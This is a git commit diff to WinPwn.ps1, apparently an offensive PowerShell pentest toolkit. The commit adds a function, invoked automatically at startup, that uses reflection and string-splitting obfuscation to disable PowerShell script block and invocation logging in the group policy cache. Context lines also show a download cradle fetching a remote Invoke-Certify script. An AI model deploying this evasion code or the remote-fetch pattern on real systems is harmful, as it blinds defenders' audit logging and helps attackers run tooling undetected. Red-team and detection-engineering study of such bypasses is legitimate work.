e1b989011867d2bf6c7d65b78b38b69d55b6be30
S3cur3Th1sSh1t <27858067+S3cur3Th1sSh1t@users.noreply.github.com>
2021-10-14 11:15:54 +0200

    Add ScriptBlockLogging bypass

--- WinPwn.ps1
+++ WinPwn.ps1
@@ -4154,7 +4154,8 @@ function WinPwn
         [switch]
         $sharpcloud   
     )
-   
+  scriptblocklogbypass
+  
 @'
 
              
@@ -4323,6 +4324,22 @@ WinPwn -PowerSharpPack -consoleoutput -noninteractive					    -> Execute Seatbel
  While ($masterquestion -ne 17)
      
    
+}
+
+function scriptblocklogbypass
+{
+	$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils')."GetFie`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static')
+	If ($GroupPolicyField) {
+    		$GroupPolicyCache = $GroupPolicyField.GetValue($null)
+    		If ($GroupPolicyCache['ScriptB'+'lockLogging']) {
+        		$GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0
+        		$GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
+    		}
+    		$val = [System.Collections.Generic.Dictionary[string,System.Object]]::new()
+    		$val.Add('EnableScriptB'+'lockLogging', 0)
+    		$val.Add('EnableScriptB'+'lockInvocationLogging', 0)
+    		$GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging'] = $val
+	}
 }
 
 $Certify = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Certify.ps1')
